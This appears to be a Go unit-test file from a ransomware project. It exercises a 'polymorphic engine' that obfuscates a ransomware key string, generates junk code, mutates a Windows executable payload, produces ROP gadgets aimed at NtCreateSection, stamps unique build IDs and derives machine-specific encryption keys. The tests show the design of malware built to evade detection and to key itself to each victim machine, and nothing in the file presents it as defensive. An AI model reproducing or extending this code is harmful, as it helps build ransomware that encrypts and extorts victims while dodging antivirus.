package ransomware

import (
	"testing"
)

func TestNewPolymorphEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)
	if pe == nil {
		t.Fatal("NewPolymorphEngine() returned nil")
	}
}

func TestPolymorphObfuscateString(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)

	input := "X404X_RANSOMWARE_KEY"
	output := pe.ObfuscateString(input)
	if output == "" {
		t.Error("ObfuscateString returned empty")
	}
	if output == input {
		t.Log("ObfuscateString returned same string (no-op in test env)")
	}
}

func TestPolymorphGenerateJunkCode(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)

	code := pe.GenerateJunkCode()
	if len(code) == 0 {
		t.Error("GenerateJunkCode returned empty")
	}
}

func TestPolymorphBuildID(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)

	id1 := pe.GenerateUniqueBuildID()
	id2 := pe.GenerateUniqueBuildID()
	if id1 == "" || id2 == "" {
		t.Error("BuildID should not be empty")
	}
	if id1 == id2 {
		t.Error("Sequential BuildIDs should be unique")
	}
}

func TestPolymorphBuildPolymorphicPayload(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)

	base := []byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00")
	result := pe.BuildPolymorphicPayload(base)
	if len(result) == 0 {
		t.Error("BuildPolymorphicPayload returned empty")
	}
}

func TestPolymorphGenerateROPGadget(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)

	gadget := pe.GenerateROPGadget("NtCreateSection", 0x100)
	if len(gadget) == 0 {
		t.Log("GenerateROPGadget returned empty (expected if no ROP generation)")
	}
}

func TestPolymorphMachineSpecificKey(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pe := NewPolymorphEngine(cfg)

	key1 := pe.DeriveMachineSpecificKey(0xA1B2C3D4)
	key2 := pe.DeriveMachineSpecificKey(0xA1B2C3D4)
	key3 := pe.DeriveMachineSpecificKey(0xDEADBEEF)

	if len(key1) == 0 {
		t.Error("Machine key should not be empty")
	}
	if len(key1) != len(key2) {
		t.Error("Same serial should produce same key length")
	}
	if string(key1) == string(key3) {
		t.Log("Different serials produced same key (possible but unlikely)")
	}
}
